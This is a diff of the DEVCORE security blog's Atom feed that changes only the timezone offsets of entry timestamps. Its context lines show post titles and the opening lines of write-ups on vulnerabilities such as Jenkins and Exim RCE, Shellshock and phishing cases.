    <content type="html">&lt;p&gt;&lt;a href=&quot;/blog/2019/06/21/operation-crack-hacking-IDA-Pro-installer-PRNG-from-an-unusual-way-en/&quot;&gt;English Version&lt;/a&gt;&lt;br /&gt;
 &lt;a href=&quot;/blog/2019/06/21/operation-crack-hacking-IDA-Pro-installer-PRNG-from-an-unusual-way/&quot;&gt;中文版本&lt;/a&gt;&lt;/p&gt;
@@ -526,7 +851,7 @@ ABCDEFGHJKLMPQRSTUVWXYZabcdefghijkmpqrstuvwxyz23456789
  <entry>
    <title>破密行動: 以不尋常的角度破解 IDA Pro 偽隨機數</title>
    <link href="https://devco.re/blog/2019/06/21/operation-crack-hacking-IDA-Pro-installer-PRNG-from-an-unusual-way/"/>
-   <updated>2019-06-21T00:00:00+08:00</updated>
+   <updated>2019-06-21T00:00:00-07:00</updated>
    <id>https://devco.re/blog/2019/06/21/operation-crack-hacking-IDA-Pro-installer-PRNG-from-an-unusual-way</id>
    <content type="html">&lt;p&gt;&lt;a href=&quot;/blog/2019/06/21/operation-crack-hacking-IDA-Pro-installer-PRNG-from-an-unusual-way-en/&quot;&gt;English Version&lt;/a&gt;&lt;br /&gt;
 &lt;a href=&quot;/blog/2019/06/21/operation-crack-hacking-IDA-Pro-installer-PRNG-from-an-unusual-way/&quot;&gt;中文版本&lt;/a&gt;&lt;/p&gt;
@@ -667,7 +992,7 @@ ABCDEFGHJKLMPQRSTUVWXYZabcdefghijkmpqrstuvwxyz23456789
  <entry>
    <title>Hacking Jenkins Part 2 - Abusing Meta Programming for Unauthenticated RCE!(EN)</title>
    <link href="https://devco.re/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE-en/"/>
-   <updated>2019-02-19T00:00:00+08:00</updated>
+   <updated>2019-02-19T00:00:00-08:00</updated>
    <id>https://devco.re/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE-en</id>
    <content type="html">&lt;p&gt;&lt;a href=&quot;/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE-en/&quot;&gt;English Version&lt;/a&gt;&lt;br /&gt;
 &lt;a href=&quot;/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE/&quot;&gt;中文版本&lt;/a&gt;&lt;/p&gt;
@@ -978,7 +1303,7 @@ import Orange;
  <entry>
    <title>Hacking Jenkins Part 2 - Abusing Meta Programming for Unauthenticated RCE!</title>
    <link href="https://devco.re/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE/"/>
-   <updated>2019-02-19T00:00:00+08:00</updated>
+   <updated>2019-02-19T00:00:00-08:00</updated>
    <id>https://devco.re/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE</id>
    <content type="html">&lt;p&gt;&lt;a href=&quot;/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE-en/&quot;&gt;English Version&lt;/a&gt;&lt;br /&gt;
 &lt;a href=&quot;/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE/&quot;&gt;中文版本&lt;/a&gt;&lt;/p&gt;
@@ -1297,7 +1622,7 @@ import Orange;
  <entry>
    <title>Hacking Jenkins Part 1 - Play with Dynamic Routing (EN)</title>
    <link href="https://devco.re/blog/2019/01/16/hacking-Jenkins-part1-play-with-dynamic-routing-en/"/>
-   <updated>2019-01-16T00:00:00+08:00</updated>
+   <updated>2019-01-16T00:00:00-08:00</updated>
    <id>https://devco.re/blog/2019/01/16/hacking-Jenkins-part1-play-with-dynamic-routing-en</id>
    <content type="html">&lt;p&gt;&lt;a href=&quot;/blog/2019/01/16/hacking-Jenkins-part1-play-with-dynamic-routing-en/&quot;&gt;English Version&lt;/a&gt;&lt;br /&gt;
 &lt;a href=&quot;/blog/2019/01/16/hacking-Jenkins-part1-play-with-dynamic-routing/&quot;&gt;中文版本&lt;/a&gt;&lt;/p&gt;
@@ -1551,7 +1876,7 @@ Due to the lack of permission check on search functionality. By modifying the &l
  <entry>
    <title>Hacking Jenkins Part 1 - Play with Dynamic Routing</title>
    <link href="https://devco.re/blog/2019/01/16/hacking-Jenkins-part1-play-with-dynamic-routing/"/>
-   <updated>2019-01-16T00:00:00+08:00</updated>
+   <updated>2019-01-16T00:00:00-08:00</updated>
    <id>https://devco.re/blog/2019/01/16/hacking-Jenkins-part1-play-with-dynamic-routing</id>
    <content type="html">&lt;p&gt;&lt;a href=&quot;/blog/2019/01/16/hacking-Jenkins-part1-play-with-dynamic-routing-en/&quot;&gt;English Version&lt;/a&gt;&lt;br /&gt;
 &lt;a href=&quot;/blog/2019/01/16/hacking-Jenkins-part1-play-with-dynamic-routing/&quot;&gt;中文版本&lt;/a&gt;&lt;/p&gt;
@@ -1809,7 +2134,7 @@ Due to the lack of permission check on search functionality. By modifying the &l
  <entry>
    <title>Exim Off-by-one RCE: Exploiting CVE-2018-6789 with Fully Mitigations Bypassing</title>
    <link href="https://devco.re/blog/2018/03/06/exim-off-by-one-RCE-exploiting-CVE-2018-6789-en/"/>
-   <updated>2018-03-06T00:00:00+08:00</updated>
+   <updated>2018-03-06T00:00:00-08:00</updated>
    <id>https://devco.re/blog/2018/03/06/exim-off-by-one-RCE-exploiting-CVE-2018-6789-en</id>
    <content type="html">&lt;h2 id=&quot;overview&quot;&gt;Overview&lt;/h2&gt;
 &lt;p&gt;We reported an overflow vulnerability in the base64 decode function of &lt;a href=&quot;https://www.exim.org/&quot;&gt;&lt;strong&gt;Exim&lt;/strong&gt;&lt;/a&gt; on 5 February, 2018, identified as &lt;a href=&quot;https://exim.org/static/doc/security/CVE-2018-6789.txt&quot;&gt;CVE-2018-6789&lt;/a&gt;. This bug exists since the first commit of exim, hence &lt;strong&gt;ALL versions&lt;/strong&gt; are affected. According to our research, it can be leveraged to gain &lt;strong&gt;Pre-auth Remote Code Execution&lt;/strong&gt; and at least 400k servers are at risk. Patched version 4.90.1 is already released and we suggest to upgrade exim immediately.&lt;/p&gt;
@@ -2043,7 +2368,7 @@ http://www.openwall.com/lists/oss-security/2018/02/07/2&lt;/p&gt;
  <entry>
    <title>Exim 任意代碼執行漏洞 (CVE-2018-6789)</title>
    <link href="https://devco.re/blog/2018/03/06/exim-off-by-one-RCE-exploiting-CVE-2018-6789/"/>
-   <updated>2018-03-06T00:00:00+08:00</updated>
+   <updated>2018-03-06T00:00:00-08:00</updated>
    <id>https://devco.re/blog/2018/03/06/exim-off-by-one-RCE-exploiting-CVE-2018-6789</id>
    <content type="html">&lt;h2 id=&quot;內容&quot;&gt;內容&lt;/h2&gt;
 
@@ -2062,7 +2387,7 @@ http://www.openwall.com/lists/oss-security/2018/02/07/2&lt;/p&gt;
  <entry>
    <title>Sandstorm Security Review</title>
    <link href="https://devco.re/blog/2018/01/26/Sandstorm-Security-Review-CVE-2017-6200-en/"/>
-   <updated>2018-01-26T00:00:00+08:00</updated>
+   <updated>2018-01-26T00:00:00-08:00</updated>
    <id>https://devco.re/blog/2018/01/26/Sandstorm-Security-Review-CVE-2017-6200-en</id>
    <content type="html">&lt;p&gt;&lt;a href=&quot;/blog/2018/01/26/Sandstorm-Security-Review-CVE-2017-6200-en/&quot;&gt;Sandstorm Security Review&lt;/a&gt; (English Version)  &lt;br /&gt;
 &lt;a href=&quot;/blog/2018/01/26/Sandstorm-Security-Review-CVE-2017-6200/&quot;&gt;一次在 Sandstorm 跳脫沙箱的滲透經驗&lt;/a&gt; (中文版本)&lt;/p&gt;
@@ -2190,7 +2515,7 @@ On Sandstorm, owners of each Grain (Sandstorm container, in short, an app sandbo
  <entry>
    <title>一次在 Sandstorm 跳脫沙箱的滲透經驗</title>
    <link href="https://devco.re/blog/2018/01/26/Sandstorm-Security-Review-CVE-2017-6200/"/>
-   <updated>2018-01-26T00:00:00+08:00</updated>
+   <updated>2018-01-26T00:00:00-08:00</updated>
    <id>https://devco.re/blog/2018/01/26/Sandstorm-Security-Review-CVE-2017-6200</id>
    <content type="html">&lt;p&gt;&lt;a href=&quot;/blog/2018/01/26/Sandstorm-Security-Review-CVE-2017-6200-en/&quot;&gt;Sandstorm Security Review&lt;/a&gt; (English Version)  &lt;br /&gt;
 &lt;a href=&quot;/blog/2018/01/26/Sandstorm-Security-Review-CVE-2017-6200/&quot;&gt;一次在 Sandstorm 跳脫沙箱的滲透經驗&lt;/a&gt; (中文版本)&lt;/p&gt;
@@ -2317,7 +2642,7 @@ On Sandstorm, owners of each Grain (Sandstorm container, in short, an app sandbo
  <entry>
    <title>Road to Exim RCE - Abusing Unsafe Memory Allocator in the Most Popular MTA</title>
    <link href="https://devco.re/blog/2017/12/11/Exim-RCE-advisory-CVE-2017-16943-en/"/>
-   <updated>2017-12-11T00:00:00+08:00</updated>
+   <updated>2017-12-11T00:00:00-08:00</updated>
    <id>https://devco.re/blog/2017/12/11/Exim-RCE-advisory-CVE-2017-16943-en</id>
    <content type="html">&lt;p&gt;On 23 November, 2017, we reported two vulnerabilities to Exim. These bugs exist in the SMTP daemon and attackers do not need to be authenticated, including CVE-2017-16943 for a use-after-free (UAF) vulnerability, which leads to Remote Code Execution (RCE); and CVE-2017-16944 for a Denial-of-Service (DoS) vulnerability.&lt;/p&gt;
 
@@ -2611,7 +2936,7 @@ https://lists.exim.org/lurker/message/20171125.034842.d1d75cac.en.html&lt;/p&gt;
  <entry>
    <title>Exim RCE 資安通報 (CVE-2017-16943)</title>
    <link href="https://devco.re/blog/2017/12/11/Exim-RCE-advisory-CVE-2017-16943/"/>
-   <updated>2017-12-11T00:00:00+08:00</updated>
+   <updated>2017-12-11T00:00:00-08:00</updated>
    <id>https://devco.re/blog/2017/12/11/Exim-RCE-advisory-CVE-2017-16943</id>
    <content type="html">&lt;h2 id=&quot;內容&quot;&gt;內容&lt;/h2&gt;
 
@@ -2629,7 +2954,7 @@ https://lists.exim.org/lurker/message/20171125.034842.d1d75cac.en.html&lt;/p&gt;
  <entry>
    <title>WEB2PY 反序列化的安全問題－CVE-2016-3957</title>
    <link href="https://devco.re/blog/2017/01/03/web2py-unserialize-code-execution-CVE-2016-3957/"/>
-   <updated>2017-01-03T00:00:00+08:00</updated>
+   <updated>2017-01-03T00:00:00-08:00</updated>
    <id>https://devco.re/blog/2017/01/03/web2py-unserialize-code-execution-CVE-2016-3957</id>
    <content type="html">&lt;h3 id=&quot;前言&quot;&gt;前言&lt;/h3&gt;
 
@@ -2817,7 +3142,7 @@ https://lists.exim.org/lurker/message/20171125.034842.d1d75cac.en.html&lt;/p&gt;
  <entry>
    <title>IoT設備商別成為幫兇 從Dyn DDoS攻擊事件看IoT安全</title>
    <link href="https://devco.re/blog/2016/12/26/a-look-into-the-growth-of-IoT-DDoS-attacks/"/>
-   <updated>2016-12-26T00:00:00+08:00</updated>
+   <updated>2016-12-26T00:00:00-08:00</updated>
    <id>https://devco.re/blog/2016/12/26/a-look-into-the-growth-of-IoT-DDoS-attacks</id>
    <content type="html">&lt;h3 id=&quot;萬物皆聯網成為萬物皆可駭&quot;&gt;萬物皆聯網成為萬物皆可駭&lt;/h3&gt;
 
@@ -2852,7 +3177,7 @@ https://lists.exim.org/lurker/message/20171125.034842.d1d75cac.en.html&lt;/p&gt;
  <entry>
    <title>Advisory: Accellion File Transfer Appliance Vulnerability</title>
    <link href="https://devco.re/blog/2016/09/22/advisory-accellion-file-transfer-appliance-vulnerability-eng-ver/"/>
-   <updated>2016-09-22T00:00:00+08:00</updated>
+   <updated>2016-09-22T00:00:00-07:00</updated>
    <id>https://devco.re/blog/2016/09/22/advisory-accellion-file-transfer-appliance-vulnerability-eng-ver</id>
    <content type="html">&lt;p&gt;By &lt;a href=&quot;http://blog.orange.tw/&quot;&gt;Orange Tsai&lt;/a&gt;&lt;/p&gt;
 
@@ -3224,7 +3549,7 @@ Upon discovering the FTA vulnerability in early February, I notified Facebook an
  <entry>
    <title>Accellion File Transfer Appliance 弱點報告</title>
    <link href="https://devco.re/blog/2016/09/22/advisory-accellion-file-transfer-appliance-vulnerability/"/>
-   <updated>2016-09-22T00:00:00+08:00</updated>
+   <updated>2016-09-22T00:00:00-07:00</updated>
    <id>https://devco.re/blog/2016/09/22/advisory-accellion-file-transfer-appliance-vulnerability</id>
    <content type="html">&lt;p&gt;By &lt;a href=&quot;http://blog.orange.tw/&quot;&gt;Orange Tsai&lt;/a&gt;&lt;/p&gt;
 
@@ -3591,7 +3916,7 @@ bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;cat /tmp/.gg
  <entry>
    <title>電商業者的資安困境？</title>
    <link href="https://devco.re/blog/2016/07/29/the_security_dilemma_of_e-commerce/"/>
-   <updated>2016-07-29T00:00:00+08:00</updated>
+   <updated>2016-07-29T00:00:00-07:00</updated>
    <id>https://devco.re/blog/2016/07/29/the_security_dilemma_of_e-commerce</id>
    <content type="html">&lt;p&gt;台灣電商網站蓬勃發展，豐富的個資、金流都吸引了攻擊者。近期刑事局 165 反詐騙網站上常看到很多電商網站面臨個資外洩的問題，新聞也不斷報導民眾因為個資外洩被詐騙集團騙取錢財。資安問題是電商業者面臨到最大的危機，民眾也很憤怒為什麼這些企業都不肯把資安做好。但我相信，電商網站的業主也是有苦難言。不少企業知道該把資安做好，有些可能不得其法，也可能什麼都做了，卻還是無法防止自己的網站出現在 165 詐騙排行的榜單上。&lt;/p&gt;
 
@@ -3674,7 +3999,7 @@ bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;cat /tmp/.gg
  <entry>
    <title>How I Hacked Facebook, and Found Someone's Backdoor Script</title>
    <link href="https://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script-eng-ver/"/>
-   <updated>2016-04-21T00:00:00+08:00</updated>
+   <updated>2016-04-21T00:00:00-07:00</updated>
    <id>https://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script-eng-ver</id>
    <content type="html">&lt;p&gt;by &lt;a href=&quot;http://blog.orange.tw/&quot;&gt;Orange Tsai&lt;/a&gt;&lt;/p&gt;
 
@@ -4034,7 +4359,7 @@ Thanks to this event, it inspired me to write some articles about penetration :P
  <entry>
    <title>滲透 Facebook 的思路與發現</title>
    <link href="https://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script/"/>
-   <updated>2016-04-21T00:00:00+08:00</updated>
+   <updated>2016-04-21T00:00:00-07:00</updated>
    <id>https://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script</id>
    <content type="html">&lt;p&gt;by &lt;a href=&quot;http://blog.orange.tw/&quot;&gt;Orange Tsai&lt;/a&gt;&lt;/p&gt;
 
@@ -4399,7 +4724,7 @@ base64: invalid input&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  <entry>
    <title>[已結束] DEVCORE 徵求行政出納人才</title>
    <link href="https://devco.re/blog/2015/08/19/devcore-2015-recruit/"/>
-   <updated>2015-08-19T00:00:00+08:00</updated>
+   <updated>2015-08-19T00:00:00-07:00</updated>
    <id>https://devco.re/blog/2015/08/19/devcore-2015-recruit</id>
    <content type="html">&lt;p&gt;（2015.9.16 已結束徵才）&lt;/p&gt;
 
@@ -4499,7 +4824,7 @@ base64: invalid input&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  <entry>
    <title>Rails 動態樣板路徑的風險</title>
    <link href="https://devco.re/blog/2015/07/24/the-vulnerability-of-dynamic-render-paths-in-rails/"/>
-   <updated>2015-07-24T00:00:00+08:00</updated>
+   <updated>2015-07-24T00:00:00-07:00</updated>
    <id>https://devco.re/blog/2015/07/24/the-vulnerability-of-dynamic-render-paths-in-rails</id>
    <content type="html">&lt;h3 id=&quot;前言&quot;&gt;前言&lt;/h3&gt;
 
@@ -4639,7 +4964,7 @@ This is DEMO page.&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  <entry>
    <title>談 Cookie 認證安全－以宏碁雲端售票為例</title>
    <link href="https://devco.re/blog/2015/01/30/cookie-security-insight-acer/"/>
-   <updated>2015-01-30T00:00:00+08:00</updated>
+   <updated>2015-01-30T00:00:00-08:00</updated>
    <id>https://devco.re/blog/2015/01/30/cookie-security-insight-acer</id>
    <content type="html">&lt;h3 id=&quot;前言&quot;&gt;前言&lt;/h3&gt;
 
@@ -4737,7 +5062,7 @@ https://www.jody-ticket.com.tw/UTK0196_.aspx&lt;/p&gt;
  <entry>
    <title>從寬宏售票談資安</title>
    <link href="https://devco.re/blog/2015/01/09/information-security-insight-kham/"/>
-   <updated>2015-01-09T00:00:00+08:00</updated>
+   <updated>2015-01-09T00:00:00-08:00</updated>
    <id>https://devco.re/blog/2015/01/09/information-security-insight-kham</id>
    <content type="html">&lt;p&gt;戴夫寇爾部落格停載了快兩個月，非常抱歉，讓各位常常催稿的朋友們久等了 &amp;lt;(_ _)&amp;gt;&lt;br /&gt;&lt;br /&gt;
 今天就乘著全臺瘋買票的浪頭，來談談一些常被忽略的資訊安全小概念吧！&lt;/p&gt;
@@ -4824,7 +5149,7 @@ https://www.jody-ticket.com.tw/UTK0196_.aspx&lt;/p&gt;
  <entry>
    <title>Android WebView 為你的使用者打開了漏洞之門你知道嗎？</title>
    <link href="https://devco.re/blog/2014/10/13/android-webview-left-shortcuts-for-hacker/"/>
-   <updated>2014-10-13T00:00:00+08:00</updated>
+   <updated>2014-10-13T00:00:00-07:00</updated>
    <id>https://devco.re/blog/2014/10/13/android-webview-left-shortcuts-for-hacker</id>
    <content type="html">&lt;p&gt;為了解決在應用程式中顯示網頁的需求，開發者一般會使用到由系統提供的 WebView 元件。而由於 JavaScript 被廣泛應用在網頁上，開發者通常也會把 WebView 處理 JavaScript 的功能打開，好讓大部分網頁能正常運作。但就在開啟這個像是必不可少的 JavaScript 功能時，背後一些由於系統漏洞而引發出來意想不到的風險卻有機會由此而生。接下來的部分將把這些漏洞為大家做個整理。&lt;/p&gt;
 
@@ -4981,7 +5306,7 @@ https://www.jody-ticket.com.tw/UTK0196_.aspx&lt;/p&gt;
  <entry>
    <title>Shellshock (Bash CVE-2014-6271) 威脅仍在擴大中，但無需過度恐慌</title>
    <link href="https://devco.re/blog/2014/09/30/shellshock-CVE-2014-6271/"/>
-   <updated>2014-09-30T00:00:00+08:00</updated>
+   <updated>2014-09-30T00:00:00-07:00</updated>
    <id>https://devco.re/blog/2014/09/30/shellshock-CVE-2014-6271</id>
    <content type="html">&lt;p&gt;自 9/24 以來，不少資訊圈朋友日以繼夜的忙碌，這都多虧了藏在 Bash 裡 22 年的安全漏洞－&lt;a href=&quot;https://en.wikipedia.org/wiki/Shellshock_%28software_bug%29&quot;&gt;Shellshock&lt;/a&gt; (Bash CVE-2014-6271)。對於惡意攻擊者而言，這是今年來第二波淘金潮，相較於上次 &lt;a href=&quot;https://devco.re/blog/2014/04/09/openssl-heartbleed-CVE-2014-0160/&quot;&gt;Heartbleed&lt;/a&gt; 駭客們的刮刮樂遊戲需要拼運氣，這次的 Shellshock 只要一發現利用點，就能馬上擁有基本的系統操作權限，也難怪 &lt;a href=&quot;http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-6271&quot;&gt;NVD&lt;/a&gt; 給予 Shellshock 最嚴重的 10.0 分影響等級。&lt;/p&gt;
 
@@ -5262,7 +5587,7 @@ https://www.jody-ticket.com.tw/UTK0196_.aspx&lt;/p&gt;
  <entry>
    <title>網路攝影機、DVR、NVR 的資安議題 - 你知道我在看你嗎？</title>
    <link href="https://devco.re/blog/2014/09/24/security-of-ip-camera-and-nvr/"/>
-   <updated>2014-09-24T00:00:00+08:00</updated>
+   <updated>2014-09-24T00:00:00-07:00</updated>
    <id>https://devco.re/blog/2014/09/24/security-of-ip-camera-and-nvr</id>
    <content type="html">&lt;p&gt;網路攝影機的普及率在近幾年來持續攀升，除了老人與幼兒居家照護、企業室內監控等需求迅速增加之外，結合手機應用程式讓人可隨時隨地觀看影像的方便性也成為普及的原因。當大家還以為黑帽駭客的目標仍然是網站、個人電腦時，已經有許多攻擊者悄悄地將目標轉向了各種物連網設備，例如 NAS、Wireless AP、Printer 等產品，而擁有眾多用戶的網路攝影機理所當然地也是目標之一。身為安控產品，卻造成一項資安的隱憂，是不是有點諷刺呢？&lt;/p&gt;
 
@@ -5373,7 +5698,7 @@ https://www.jody-ticket.com.tw/UTK0196_.aspx&lt;/p&gt;
  <entry>
    <title>被遺忘的資訊洩漏－重點回顧</title>
    <link href="https://devco.re/blog/2014/08/26/information-leakage-in-taiwan-HITCON2014/"/>
-   <updated>2014-08-26T00:00:00+08:00</updated>
+   <updated>2014-08-26T00:00:00-07:00</updated>
    <id>https://devco.re/blog/2014/08/26/information-leakage-in-taiwan-HITCON2014</id>
    <content type="html">&lt;h3 id=&quot;前言&quot;&gt;前言&lt;/h3&gt;
 
@@ -5440,7 +5765,7 @@ https://www.jody-ticket.com.tw/UTK0196_.aspx&lt;/p&gt;
  <entry>
    <title>手機應用程式開發上被忽略的 SSL 處理</title>
    <link href="https://devco.re/blog/2014/08/15/ssl-mishandling-on-mobile-app-development/"/>
-   <updated>2014-08-15T00:00:00+08:00</updated>
+   <updated>2014-08-15T00:00:00-07:00</updated>
    <id>https://devco.re/blog/2014/08/15/ssl-mishandling-on-mobile-app-development</id>
    <content type="html">&lt;p&gt;在網路上傳輸敏感資訊時，通常會使用 HTTPS 協定，讓客戶端與伺服器端對資料進行 SSL 加密處理，以降低資料在傳輸過程中被監聽或中間人攻擊的風險。HTTPS 的重要性逐漸被重視，Google 除了預設開啟 HTTPS 之外，未來更會將 &lt;a href=&quot;http://googlewebmastercentral.blogspot.tw/2014/08/https-as-ranking-signal.html&quot;&gt;HTTPS 的網站搜尋排名加分&lt;/a&gt;。但為了確保傳輸的安全，過程中客戶端會核對伺服器的憑證鏈 (certificate chain) 是否有效，若判定為無效時會作出警告。(詳見&lt;a href=&quot;http://en.wikipedia.org/wiki/Secure_Sockets_Layer&quot;&gt;Wikipedia&lt;/a&gt;)&lt;/p&gt;
 
@@ -5704,7 +6029,7 @@ https://www.jody-ticket.com.tw/UTK0196_.aspx&lt;/p&gt;
  <entry>
    <title>設備不良設定帶來的安全風險：以 WAF 為例</title>
    <link href="https://devco.re/blog/2014/07/18/waf-configuration-security-issue/"/>
-   <updated>2014-07-18T00:00:00+08:00</updated>
+   <updated>2014-07-18T00:00:00-07:00</updated>
    <id>https://devco.re/blog/2014/07/18/waf-configuration-security-issue</id>
    <content type="html">&lt;p&gt;過去談到網站安全，通常會使用防火牆或 IDS 進行防護。但近年來網站安全議題都是以網頁應用程式的漏洞居多，無法單靠防火牆阻擋。以 OWASP Top 10 2013 的第一名 Injection 而言，多半是程式撰寫方法不嚴謹所造成，因此才有了網頁應用程式防火牆 (Web Application Firewall, WAF) 的出現。&lt;/p&gt;
 
@@ -5762,7 +6087,7 @@ https://www.jody-ticket.com.tw/UTK0196_.aspx&lt;/p&gt;
  <entry>
    <title>Apple ID 釣魚郵件案例</title>
    <link href="https://devco.re/blog/2014/07/03/apple-id-phishing-scam/"/>
-   <updated>2014-07-03T00:00:00+08:00</updated>
+   <updated>2014-07-03T00:00:00-07:00</updated>
    <id>https://devco.re/blog/2014/07/03/apple-id-phishing-scam</id>
    <content type="html">&lt;p&gt;今天又有不怕死的人寄來釣魚信了，這次是騙取 Apple ID。讓我們來看看這封信，其中內容有非常多破綻，也已經被 Gmail 直接定為 Spam 了，非常可憐。除了信件之外，釣魚的網頁本身也很值得我們借鏡，讓我們來看看這次的釣魚郵件案例。&lt;/p&gt;
 
@@ -5890,7 +6215,7 @@ https://www.jody-ticket.com.tw/UTK0196_.aspx&lt;/p&gt;
  <entry>
    <title>如何正確的取得使用者 IP？</title>
    <link href="https://devco.re/blog/2014/06/19/client-ip-detection/"/>
-   <updated>2014-06-19T00:00:00+08:00</updated>
+   <updated>2014-06-19T00:00:00-07:00</updated>
    <id>https://devco.re/blog/2014/06/19/client-ip-detection</id>
    <content type="html">&lt;p&gt;很多網站都會有偵測使用者 IP 的功能，不管是判斷使用者來自哪邊，或者是記錄使用者的位置。但是你知道嗎？網路上大多數的教學全部都是「錯誤」的。正確的程式寫法可以確保知道訪客的 IP，但是錯誤的寫法卻可能讓網站管理者永遠不知道犯罪者的來源。&lt;/p&gt;
 
@@ -6018,7 +6343,7 @@ https://www.jody-ticket.com.tw/UTK0196_.aspx&lt;/p&gt;
  <entry>
    <title>Zone Transfer Statistics of Alexa Top 1 Million</title>
    <link href="https://devco.re/blog/2014/06/13/zone-transfer-statistics-of-alexa-top-1m/"/>
-   <updated>2014-06-13T00:00:00+08:00</updated>
+   <updated>2014-06-13T00:00:00-07:00</updated>
    <id>https://devco.re/blog/2014/06/13/zone-transfer-statistics-of-alexa-top-1m</id>
    <content type="html">&lt;h3 id=&quot;zone-transfer-世界大揭秘&quot;&gt;Zone Transfer 世界大揭秘&lt;/h3&gt;
 
@@ -6234,7 +6559,7 @@ https://www.jody-ticket.com.tw/UTK0196_.aspx&lt;/p&gt;
  <entry>
    <title>HttpOnly - HTTP Headers 的資安議題 (3)</title>
    <link href="https://devco.re/blog/2014/06/11/setcookie-httponly-security-issues-of-http-headers-3/"/>
-   <updated>2014-06-11T00:00:00+08:00</updated>
+   <updated>2014-06-11T00:00:00-07:00</updated>
    <id>https://devco.re/blog/2014/06/11/setcookie-httponly-security-issues-of-http-headers-3</id>
    <content type="html">&lt;p&gt;上次我們提到了 &lt;a href=&quot;https://devco.re/blog/2014/04/08/security-issues-of-http-headers-2-content-security-policy/&quot;&gt;Content-Security-Pilicy&lt;/a&gt;，這次我們來聊聊同樣是為了防禦 XSS 而生的另一個技術。&lt;/p&gt;
 
@@ -6331,7 +6656,7 @@ https://www.jody-ticket.com.tw/UTK0196_.aspx&lt;/p&gt;
  <entry>
    <title>OpenSSL 再爆嚴重漏洞，部分重要網站仍在風險中！</title>
    <link href="https://devco.re/blog/2014/06/09/openssl-CVE-2014-0224-ccs-injection/"/>
-   <updated>2014-06-09T00:00:00+08:00</updated>
+   <updated>2014-06-09T00:00:00-07:00</updated>
    <id>https://devco.re/blog/2014/06/09/openssl-CVE-2014-0224-ccs-injection</id>
    <content type="html">&lt;p&gt;(本篇最後更新時間：2014.6.9 15:40 pm)&lt;/p&gt;
 
@@ -6410,7 +6735,7 @@ https://www.jody-ticket.com.tw/UTK0196_.aspx&lt;/p&gt;
  <entry>
    <title>HTTP Session 攻擊與防護</title>
    <link href="https://devco.re/blog/2014/06/03/http-session-protection/"/>
-   <updated>2014-06-03T00:00:00+08:00</updated>
+   <updated>2014-06-03T00:00:00-07:00</updated>
    <id>https://devco.re/blog/2014/06/03/http-session-protection</id>
    <content type="html">&lt;h3 id=&quot;前言&quot;&gt;前言&lt;/h3&gt;
 
@@ -6559,7 +6884,7 @@ https://www.jody-ticket.com.tw/UTK0196_.aspx&lt;/p&gt;
  <entry>
    <title>LINE 免費貼圖釣魚訊息分析</title>
    <link href="https://devco.re/blog/2014/05/12/line-phishing/"/>
-   <updated>2014-05-12T00:00:00+08:00</updated>
+   <updated>2014-05-12T00:00:00-07:00</updated>
    <id>https://devco.re/blog/2014/05/12/line-phishing</id>
    <content type="html">&lt;p&gt;晚上突然接到社群朋友傳 LINE 的訊息過來，定睛一看並不單純。這網址看起來就是釣魚網站啊？怎麼會這樣呢？難道是朋友在測試我們的警覺心夠不夠嗎？讓我們看下去這個釣魚網頁怎麼玩。&lt;/p&gt;
 
@@ -6599,7 +6924,7 @@ https://www.jody-ticket.com.tw/UTK0196_.aspx&lt;/p&gt;
  <entry>
    <title>搶搭核四與服貿熱潮的潛在詐騙網站</title>
    <link href="https://devco.re/blog/2014/05/07/vote.tw.am-potential-phishing-site/"/>
-   <updated>2014-05-07T00:00:00+08:00</updated>
+   <updated>2014-05-07T00:00:00-07:00</updated>
    <id>https://devco.re/blog/2014/05/07/vote.tw.am-potential-phishing-site</id>
    <content type="html">&lt;h3 id=&quot;votetwam&quot;&gt;vote.tw.am&lt;/h3&gt;
 
@@ -6661,7 +6986,7 @@ https://www.jody-ticket.com.tw/UTK0196_.aspx&lt;/p&gt;
  <entry>
    <title>Zone Transfer CVE-1999-0532 - 古老的 DNS 資安議題</title>
    <link href="https://devco.re/blog/2014/05/05/zone-transfer-CVE-1999-0532-an-old-dns-security-issue/"/>
-   <updated>2014-05-05T00:00:00+08:00</updated>
+   <updated>2014-05-05T00:00:00-07:00</updated>
    <id>https://devco.re/blog/2014/05/05/zone-transfer-CVE-1999-0532-an-old-dns-security-issue</id>
    <content type="html">&lt;h3 id=&quot;前言&quot;&gt;前言&lt;/h3&gt;
 
@@ -6831,7 +7156,7 @@ ls -d zonetransfer.me&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  <entry>
    <title>PHP 官網原始碼讀取案例</title>
    <link href="https://devco.re/blog/2014/04/24/php.net-insecure-direct-object-reference/"/>
-   <updated>2014-04-24T00:00:00+08:00</updated>
+   <updated>2014-04-24T00:00:00-07:00</updated>
    <id>https://devco.re/blog/2014/04/24/php.net-insecure-direct-object-reference</id>
